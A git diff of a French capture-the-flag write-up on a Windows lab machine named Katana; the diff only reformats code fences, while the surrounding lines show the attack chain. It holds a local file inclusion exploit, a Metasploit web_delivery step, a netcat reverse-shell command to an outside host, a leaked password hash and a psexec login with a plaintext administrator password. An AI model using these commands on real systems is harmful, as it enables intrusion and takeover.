@@ -15,7 +15,7 @@ Dague
 
 On effectue un scan rapide de la machine qui dispose de deux serveurs web, l'un sur le 80 et l'autre sur le port 20000 :  
 
-```plain
+```
 Nmap scan report for 10.1.1.52
 Host is up (0.046s latency).
 Not shown: 64985 closed ports, 534 filtered ports
@@ -40,13 +40,13 @@ PORT      STATE SERVICE
 
 Nmap a bien déterminé qu'il s'agit d'une machine Windows même s'il n'est pas sûr de sa version :  
 
-```plain
+```
 Running (JUST GUESSING): Microsoft Windows 7|2008|10|Vista|XP (91%)
 ```
 
 Sur le port 80 on trouve un IIS 10.0 d'après les entêtes :  
 
-```plain
+```
 Server: Microsoft-IIS/10.0
 X-Powered-By: ASP.NET
 ```
@@ -57,7 +57,7 @@ On peut dès lors supposer que l'on a affaire au second.
 
 Le port 20000 a une bannière tout autant explicite :  
 
-```plain
+```
 Server: Apache/2.4.37 (Win64) PHP/5.6.40
 ```
 
@@ -69,7 +69,7 @@ C'est en revanche plus intéressant sur le serveur Apache sur lequel on découvr
 
 D'autant plus intéressant que l'on trouve via *searchsploit* une vulnérabilité pour ce logiciel :  
 
-```plain
+```
 ############################################
 ### Exploit Title: Manhali v1.8 Local File Inclusion Vulnerability
 ### Date: 20/09/2012
@@ -149,7 +149,7 @@ On se sert de la faille dans *Manhali* pour aller lire le fichier *C:\wamp64\bin
 
 On se rend à l'adresse *http://monerosandbox.katana.wizard:20000/* mais le serveur nous demande des identifiants. Vu qu'il s'agit d'un serveur Apache on devine l'emploi d'un *.htaccess* récupérable toujours avec la même faille (présent à *C:\wamp64\scannerformonero\.htaccess*):  
 
-```plain
+```
 AuthType Basic
 AuthName "Howdy beta testers"
 AuthUserFile C:/wamp64/scannerformonero/.credentials
@@ -158,7 +158,7 @@ Require valid-user
 
 Idem avec le fichier *.credentials* :  
 
-```plain
+```
 antoine:$apr1$sdWJfQRx$egwpbkKODoufxjUG/oAnV0
 ```
 
@@ -175,7 +175,7 @@ Il est temps de voir ce que ces identifiants dissimulaient sur le serveur Apache
 
 La première idée qui me vient est de mettre un port en écoute et de voir les entêtes envoyées par le script :  
 
-```plain
+```
 $ ncat -l -p 8000 -v
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::8000
@@ -205,7 +205,7 @@ include($_POST['url']);
 
 Il y a évidement bien des façons d'exploiter cette faille. J'ai utilisé le module *web\_delivery* de Metasploit et juste passé l'URL à inclure :  
 
-```plain
+```
 msf5 exploit(multi/script/web_delivery) > [*] Using URL: http://10.254.0.29:8080/PxAh2W8I
 [*] Server started.
 [*] Run the following command on the target machine:
@@ -224,7 +224,7 @@ Le Meterpreter PHP a quelques ratées et refuse de nous donner le listing des fi
 
 Si il ne permet pas ici l'exécution de fichiers c'est en fait parce que les fonctions PHP liées ont été désactivées comme mentionnées dans le *phpinfo()* que l'on aura préalablement uploadé :  
 
-```plain
+```
 exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
 ```
 
@@ -244,7 +244,7 @@ Sans trop de surprises on a une exécution avec les droits *katana\www* et toujo
 
 Les process montrent la présence d'un serveur SSH :  
 
-```plain
+```
 ssh.exe                       8100                            0        100 K
 conhost.exe                   7684                            0        488 K
 sshd.exe                      2516                            0         96 K
@@ -260,13 +260,13 @@ La joie est malheureusement de courte durée car la session très vite interromp
 
 La solution est d'uploader un netcat sur le système est de le lancer via SSH ce qui nous permet d'avoir un reverse shell stable :  
 
-```plain
+```
 ssh -p 2223 antoine@127.0.0.1 'c:\wamp64\nc64.exe -e cmd.exe 10.254.0.29 9999'
 ```
 
 Cette fois on obtient notre flag :  
 
-```plain
+```
 antoine@KATANA C:\Users\Antoine>dir
  Volume in drive C has no label.
  Volume Serial Number is 1684-CC9E
@@ -322,7 +322,7 @@ Tsurugi
 
 Le reste est très simple :  
 
-```plain
+```
 $ PYTHONPATH=. python examples/psexec.py KATANA/administrator:mrlolixcobson87@10.1.1.52
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -347,7 +347,7 @@ ac72d3e13e411fe53946a93642b3832b
 
 Il y avait un autre vecteur d'attaque sur le système (mais qui devait nécessiter de pouvoir relancer un service) :  
 
-```plain
+```
 c:\Users\www>type todo.txt
 - Patch Wamp permissions
 c:\Users\www>icacls c:\wamp64
